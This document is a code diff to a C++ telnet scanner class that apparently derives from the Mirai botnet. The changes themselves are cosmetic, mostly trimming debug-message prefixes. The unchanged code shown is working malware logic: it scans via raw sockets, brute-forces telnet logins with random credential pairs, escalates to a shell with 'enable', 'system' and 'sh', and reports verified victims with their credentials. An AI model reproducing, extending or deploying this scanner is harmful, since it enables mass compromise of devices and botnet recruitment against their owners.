@@ -165,9 +165,9 @@ class Scanner {
         while (true) {
           int n;
           char dgram[1514];
-          struct iphdr *iph = (struct iphdr *)dgram;
-          struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
-          struct scanner_connection *conn;
+          struct iphdr * iph = (struct iphdr *)dgram;
+          struct tcphdr * tcph = (struct tcphdr *)(iph + 1);
+          struct scanner_connection * conn;
 
           errno = 0;
           n = recvfrom(raw_sock, dgram, sizeof(dgram), MSG_NOSIGNAL, NULL, NULL);
@@ -212,7 +212,7 @@ class Scanner {
           conn->dst_port = tcph->source;
           setup_connection(conn);
           #if defined (TALK)
-          std::cout << "[scanner] FD%d Attempting to brute a found IP.";
+          std::cout << "FD%d Attempting to brute a found IP.";
           #endif
         }
 
@@ -284,11 +284,11 @@ class Scanner {
               conn->auth = random_auth_entry();
               conn->rdbuf_pos = 0;
               #if defined(TALK)
-              printf("[scanner] FD%d connected. Trying %s:%s\n", conn->fd, conn->auth->username, conn->auth->password);
+              printf("FD%d connected. Trying %s:%s\n", conn->fd, conn->auth->username, conn->auth->password);
               #endif
             } else {
               #if defined(TALK)
-              printf("[scanner] FD%d error while connecting = %d\n", conn->fd, err);
+              printf("FD%d error while connecting = %d\n", conn->fd, err);
               #endif
               close(conn->fd);
               conn->fd = -1;
@@ -313,7 +313,7 @@ class Scanner {
               ret = recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
               if (ret == 0) {
                 #if defined(TALK)
-                printf("[scanner] FD%d connection gracefully closed\n", conn->fd);
+                printf("FD%d connection gracefully closed\n", conn->fd);
                 #endif
                 errno = ECONNRESET;
                 // Fall through to closing connection below.
@@ -322,7 +322,7 @@ class Scanner {
               if (ret == -1) {
                 if (errno != EAGAIN && errno != EWOULDBLOCK) {
                   #if defined(TALK)
-                  printf("[scanner] FD%d lost connection\n", conn->fd);
+                  printf("FD%d lost connection\n", conn->fd);
                   #endif
                   close(conn->fd);
                   conn->fd = -1;
@@ -334,7 +334,7 @@ class Scanner {
                   } else {
                     setup_connection(conn);
                     #if defined(TALK)
-                    printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
+                    printf("FD%d retrying with different auth combo!\n", conn->fd);
                     #endif
                   }
                 }
@@ -351,7 +351,7 @@ class Scanner {
                   if ((consumed = consume_iacs(conn)) > 0) {
                     conn->state = scanner_connection::SC_WAITING_USERNAME;
                     #if defined(TALK)
-                    printf("[scanner] FD%d finished telnet negotiation\n", conn->fd);
+                    printf("FD%d finished telnet negotiation\n", conn->fd);
                     #endif
                   }
                   break;
@@ -361,14 +361,14 @@ class Scanner {
                     send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                     conn->state = scanner_connection::SC_WAITING_PASSWORD;
                     #if defined(TALK)
-                    printf("[scanner] FD%d received username prompt\n", conn->fd);
+                    printf("FD%d received username prompt\n", conn->fd);
                     #endif
                   }
                   break;
                 case scanner_connection::SC_WAITING_PASSWORD:
                   if ((consumed = consume_pass_prompt(conn)) > 0) {
                     #if defined(TALK)
-                    printf("[scanner] FD%d received password prompt\n", conn->fd);
+                    printf("FD%d received password prompt\n", conn->fd);
                     #endif
 
                     // Send password
@@ -384,7 +384,7 @@ class Scanner {
                     int tmp_len;
 
                     #if defined(TALK)
-                    printf("[scanner] FD%d received shell prompt\n", conn->fd);
+                    printf("FD%d received shell prompt\n", conn->fd);
                     #endif
 
                     // Send enable / system / shell / sh to session to drop into
@@ -401,7 +401,7 @@ class Scanner {
                     int tmp_len;
 
                     #if defined(TALK)
-                    printf("[scanner] FD%d received sh prompt\n", conn->fd);
+                    printf("FD%d received sh prompt\n", conn->fd);
                     #endif
 
                     tmp_str = (char *) O("system");
@@ -417,7 +417,7 @@ class Scanner {
                     int tmp_len;
 
                     #if defined(TALK)
-                    printf("[scanner] FD%d received sh prompt\n", conn->fd);
+                    printf("FD%d received sh prompt\n", conn->fd);
                     #endif
 
                     tmp_str = (char *) O("shell");
@@ -433,7 +433,7 @@ class Scanner {
                     int tmp_len;
 
                     #if defined(TALK)
-                    printf("[scanner] FD%d received enable prompt\n", conn->fd);
+                    printf("FD%d received enable prompt\n", conn->fd);
                     #endif
 
                     tmp_str = (char *) O("sh");
@@ -449,7 +449,7 @@ class Scanner {
                     int tmp_len;
 
                     #if defined(TALK)
-                    printf("[scanner] FD%d received sh prompt\n", conn->fd);
+                    printf("FD%d received sh prompt\n", conn->fd);
                     #endif
 
                     // Send query string
@@ -464,7 +464,7 @@ class Scanner {
                   consumed = consume_resp_prompt(conn);
                   if (consumed == -1) {
                     #if defined(TALK)
-                    printf("[scanner] FD%d invalid username/password combo\n", conn->fd);
+                    printf("FD%d invalid username/password combo\n", conn->fd);
                     #endif
                     close(conn->fd);
                     conn->fd = -1;
@@ -476,14 +476,14 @@ class Scanner {
                     } else {
                       setup_connection(conn);
                       #if defined(TALK)
-                      printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
+                      printf("FD%d retrying with different auth combo!\n", conn->fd);
                       #endif
                     }
                   } else if (consumed > 0) {
                     char *tmp_str;
                     int tmp_len;
                     #if defined(TALK)
-                    printf("[scanner] FD%d Found verified working telnet\n", conn->fd);
+                    printf("FD%d Found verified working telnet\n", conn->fd);
                     #endif
                     report_working(conn->dst_addr, conn->dst_port, conn->auth);
                     close(conn->fd);
@@ -778,7 +778,7 @@ class Scanner {
       if (prompt_ending == -1) {
         int tmp;
 
-        if ((tmp = Utils().memsearch(conn->rdbuf, conn->rdbuf_pos, "assword", 7)) != -1)
+        if ((tmp = Utils().memsearch(conn->rdbuf, conn->rdbuf_pos, (char *) "assword", 7)) != -1)
           prompt_ending = tmp;
       }
 
